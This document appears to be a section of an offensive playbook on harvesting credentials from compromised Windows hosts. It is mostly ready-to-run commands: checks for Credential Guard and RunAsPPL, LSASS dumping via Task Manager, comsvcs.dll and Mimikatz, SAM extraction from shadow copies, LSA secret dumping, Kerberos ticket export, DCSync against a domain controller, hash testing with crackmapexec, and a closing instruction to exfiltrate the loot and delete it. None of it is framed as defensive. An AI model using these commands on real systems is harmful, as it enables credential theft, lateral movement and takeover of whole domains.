# Credential harvesting

Extracting credentials from a compromised host to enable lateral movement
and collection from additional systems. Requires local admin or SYSTEM
privileges for most techniques.

## Check what protections are in place first

```powershell
# is Credential Guard running? (blocks plaintext password extraction from LSASS)
(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning
# 1 = Credential Guard active; plaintext passwords will not be in LSASS

# is RunAsPPL enabled? (LSASS Protected Process Light: blocks direct injection)
(Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa).RunAsPPL
# 1 = PPL active; direct LSASS access requires a driver-level bypass
```

## LSASS memory extraction

### Method 1: Task Manager dump (interactive, no tooling)

```text
# requires GUI access or RDP
# Task Manager -> Details -> lsass.exe -> Create dump file
# output: C:\Users\<user>\AppData\Local\Temp\lsass.DMP
# move the dump to a system where Mimikatz can process it offline
```

### Method 2: comsvcs.dll (LOLbin, no external tools)

```powershell
$lsassPid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Temp\lsass.dmp full
```

### Method 3: Mimikatz (if AMSI and AV bypassed)

```powershell
# in-process: runs in the current PowerShell session
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# extract Kerberos tickets
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

### Method 4: Process injection into LSASS (avoids direct handle)

See the evasion section for injection techniques. The harvesting command
runs inside LSASS's memory space, bypassing some EDR hooks that monitor
direct LSASS access.

## Processing a dump offline

Transfer the dump to an attacker-controlled system and process it there:

```bash
# pypykatz: Python implementation of Mimikatz
pip install pypykatz
pypykatz lsa minidump lsass.dmp

# output: plaintext passwords (if Credential Guard absent), NTLM hashes,
# Kerberos tickets (in .kirbi format)
```

## SAM database (local accounts)

```powershell
# method 1: shadow copy extraction (avoids touching LSASS)
$shadow = (vssadmin list shadows | Select-String 'Volume Shadow Copy').Matches.Value |
  Select-Object -Last 1
cmd /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM"
cmd /c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM"

# method 2: reg save (requires SYSTEM)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYS

# extract hashes offline
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

## LSA secrets and cached domain credentials

```powershell
# requires SYSTEM; extracts service account passwords and cached logon hashes
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
Invoke-Mimikatz -Command '"lsadump::cache"'
```

## Kerberos ticket theft and Kerberoasting

```powershell
# list all tickets in the current session
klist

# export all tickets (Mimikatz)
Invoke-Mimikatz -Command '"kerberos::list /export"'
# output: Base64-encoded .kirbi files

# Kerberoasting: request TGS for SPNs and crack offline
# covered in detail in the crypto-attacks section
```

## DCSync (domain admin or delegation rights required)

DCSync replicates credentials from the domain controller without running
anything on the DC itself:

```powershell
# requires Domain Admin, or Replicating Directory Changes + Replicating Directory Changes All
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:Administrator"'

# all users (generates significant replication traffic)
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /all /csv"'
```

## Verify and stage

After harvesting:

```bash
# test NTLM hashes with crackmapexec before exfiltrating
crackmapexec smb TARGET_IP -u Administrator -H NTLM_HASH
# look for 'Pwn3d!' in output = local admin on that host

# stage harvested material for exfiltration
# hashes, kirbi files, and any exported credential material
```

Do not store credential material on the compromised host longer than necessary.
Exfiltrate and then delete.
